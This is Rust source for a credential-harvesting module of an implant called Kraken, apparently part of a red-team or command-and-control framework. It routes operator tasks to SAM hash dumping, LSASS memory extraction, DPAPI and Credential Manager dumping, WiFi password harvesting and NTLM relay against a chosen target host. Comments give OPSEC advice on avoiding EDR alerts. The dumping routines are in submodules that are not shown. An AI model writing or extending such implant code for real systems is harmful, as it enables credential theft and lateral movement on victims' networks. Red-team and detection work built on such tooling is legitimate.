//! mod-creds: Credential Harvesting Module for Kraken implant
//!
//! Provides credential extraction techniques:
//! - SAM: Local account hashes from registry
//! - LSASS: Memory credential extraction
//! - DPAPI: Data Protection API secrets
//! - Vault: Windows Credential Manager
//!
//! ## OPSEC Considerations
//! - LSASS access triggers EDR alerts
//! - SAM requires SYSTEM privileges
//! - Consider using existing tokens before dumping
//!
//! Detection rules: wiki/detection/sigma/kraken_creds_*.yml

#[allow(unused_imports)]
use common::{CredentialOutput, KrakenError, Module, ModuleId, TaskId, TaskResult};
use prost::Message;
use protocol::{credential_task, CredentialTask};

pub mod crypto;
pub mod dpapi;
pub mod lsass;
pub mod ntlm_relay;
pub mod sam;
pub mod syskey;
pub mod vault;
pub mod wifi;

pub struct CredentialModule {
    id: ModuleId,
}

impl CredentialModule {
    pub fn new() -> Self {
        Self {
            id: ModuleId::new("creds"),
        }
    }
}

impl Default for CredentialModule {
    fn default() -> Self {
        Self::new()
    }
}

impl Module for CredentialModule {
    fn id(&self) -> &ModuleId {
        &self.id
    }

    fn name(&self) -> &'static str {
        "Credential Harvesting"
    }

    fn version(&self) -> &'static str {
        env!("CARGO_PKG_VERSION")
    }

    fn handle(&self, _task_id: TaskId, task_data: &[u8]) -> Result<TaskResult, KrakenError> {
        let task: CredentialTask =
            CredentialTask::decode(task_data).map_err(|e| KrakenError::Protocol(e.to_string()))?;

        match task.operation {
            Some(credential_task::Operation::Sam(ref req)) => {
                let result = sam::dump(req)?;
                Ok(TaskResult::Credential(result))
            }
            Some(credential_task::Operation::Lsass(ref req)) => {
                let result = lsass::dump(req)?;
                Ok(TaskResult::Credential(result))
            }
            Some(credential_task::Operation::Secrets(ref _req)) => {
                // LSA Secrets - stub for now
                Err(KrakenError::Module("LSA Secrets not yet implemented".into()))
            }
            Some(credential_task::Operation::Dpapi(ref req)) => {
                let result = dpapi::dump(req)?;
                Ok(TaskResult::Credential(result))
            }
            Some(credential_task::Operation::Vault(ref _req)) => {
                let result = vault::dump()?;
                Ok(TaskResult::Credential(result))
            }
            None => Err(KrakenError::Protocol("missing credential operation".into())),
        }
    }
}

// For dynamic loading support
#[cfg(feature = "dynamic-entry")]
common::kraken_module_entry!(CredentialModule);

/// Thin wrapper module for WiFi credential harvesting
pub struct WifiModule {
    id: ModuleId,
}

impl WifiModule {
    pub fn new() -> Self {
        Self { id: ModuleId::new("wifi") }
    }
}

impl Default for WifiModule {
    fn default() -> Self { Self::new() }
}

impl Module for WifiModule {
    fn id(&self) -> &ModuleId { &self.id }
    fn name(&self) -> &'static str { "WiFi Credential Harvesting" }
    fn version(&self) -> &'static str { env!("CARGO_PKG_VERSION") }

    fn handle(&self, _task_id: TaskId, _task_data: &[u8]) -> Result<TaskResult, KrakenError> {
        let result = wifi::harvest()?;
        Ok(TaskResult::Credential(result))
    }
}

/// Thin wrapper module for NTLM relay
pub struct NtlmRelayModule {
    id: ModuleId,
}

impl NtlmRelayModule {
    pub fn new() -> Self {
        Self { id: ModuleId::new("ntlm_relay") }
    }
}

impl Default for NtlmRelayModule {
    fn default() -> Self { Self::new() }
}

impl Module for NtlmRelayModule {
    fn id(&self) -> &ModuleId { &self.id }
    fn name(&self) -> &'static str { "NTLM Relay" }
    fn version(&self) -> &'static str { env!("CARGO_PKG_VERSION") }

    fn handle(&self, _task_id: TaskId, task_data: &[u8]) -> Result<TaskResult, KrakenError> {
        let task: protocol::NtlmRelayTask = protocol::NtlmRelayTask::decode(task_data)
            .map_err(|e| KrakenError::Protocol(e.to_string()))?;

        let config = ntlm_relay::NtlmRelayConfig {
            listener_host: task.listener_host,
            listener_port: task.listener_port as u16,
            target_host: task.target_host,
            target_port: task.target_port as u16,
            target_protocol: ntlm_relay::RelayProtocol::from_str(&task.target_protocol)?,
        };

        let result = ntlm_relay::relay(&config)?;
        Ok(TaskResult::Lateral(common::LateralResult {
            success: result.success,
            target: result.target,
            method: format!("ntlm_relay/{}", task.target_protocol),
            output: format!("{} (user: {})", result.result, result.relayed_user),
            error: String::new(),
        }))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_module_id() {
        let module = CredentialModule::new();
        assert_eq!(module.id().as_str(), "creds");
        assert_eq!(module.name(), "Credential Harvesting");
    }

    #[test]
    fn test_invalid_task_data() {
        let module = CredentialModule::new();
        let result = module.handle(TaskId::new(), &[0xFF, 0xFE]);
        assert!(result.is_err());
    }
}
